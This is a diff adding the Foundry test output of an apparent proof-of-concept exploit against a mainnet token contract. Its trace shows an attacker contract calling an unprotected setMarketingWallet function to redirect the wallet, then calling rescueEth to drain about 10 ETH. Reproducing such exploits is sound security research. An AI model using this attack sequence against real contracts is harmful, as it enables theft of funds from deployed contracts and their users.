@@ -1,0 +1,48 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/INUMI_exp.sol:ContractTest
+[PASS] testPoC() (gas: 199847)
+Logs:
+  before attack: balance of attacker: 0.000000000000107297
+  after attack: balance of attacker: 10.000000000000135297
+
+Traces:
+  [4310] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("mainnet", 20729548 [2.072e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::deal(0xd215FFaf0F85fB6f93F11E49Bd6175ad58af0Dfd, 107297 [1.072e5])
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [199847] ContractTest::testPoC()
+    ├─ emit log_named_decimal_uint(key: "before attack: balance of attacker", val: 107297 [1.072e5], decimals: 18)
+    ├─ [0] VM::startPrank(0xd215FFaf0F85fB6f93F11E49Bd6175ad58af0Dfd, 0xd215FFaf0F85fB6f93F11E49Bd6175ad58af0Dfd)
+    │   └─ ← [Return]
+    ├─ [122769] → new AttackerC@0x2935D091b3bd620Ea494fdBA12550F43e7de89f5
+    │   └─ ← [Return] 613 bytes of code
+    ├─ [0] VM::deal(AttackerC: [0x2935D091b3bd620Ea494fdBA12550F43e7de89f5], 5000000000000028000 [5e18])
+    │   └─ ← [Return]
+    ├─ [24902] AttackerC::attack{value: 107297}()
+    │   ├─ [7050] 0xdb27D4ff4bE1cd04C34A7cB6f47402c37Cb73459::setMarketingWallet(AttackerC: [0x2935D091b3bd620Ea494fdBA12550F43e7de89f5])
+    │   │   ├─  emit topic 0: 0x7f645b8ba9af1a8a3cc751f36952ca80e7f26ae7d47d0ee9f4a60defc1e680d6
+    │   │   │        topic 1: 0x0000000000000000000000002935d091b3bd620ea494fdba12550f43e7de89f5
+    │   │   │        topic 2: 0x0000000000000000000000002935d091b3bd620ea494fdba12550f43e7de89f5
+    │   │   │           data: 0x
+    │   │   ├─  storage changes:
+    │   │   │   @ 8: 0x00000000000000000000000095d4dc882738af8760cb48af9fd8e350ff604d6d → 0x0000000000000000000000002935d091b3bd620ea494fdba12550f43e7de89f5
+    │   │   └─ ← [Stop]
+    │   ├─ [7299] 0xdb27D4ff4bE1cd04C34A7cB6f47402c37Cb73459::rescueEth()
+    │   │   ├─ [41] AttackerC::receive{value: 5000000000000000000}()
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Stop]
+    │   ├─ [0] 0xd215FFaf0F85fB6f93F11E49Bd6175ad58af0Dfd::fallback{value: 10000000000000135297}()
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::stopPrank()
+    │   └─ ← [Return]
+    ├─ emit log_named_decimal_uint(key: "after attack: balance of attacker", val: 10000000000000135297 [1e19], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.33s (698.28ms CPU time)
+
+Ran 1 test suite in 4.51s (2.33s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
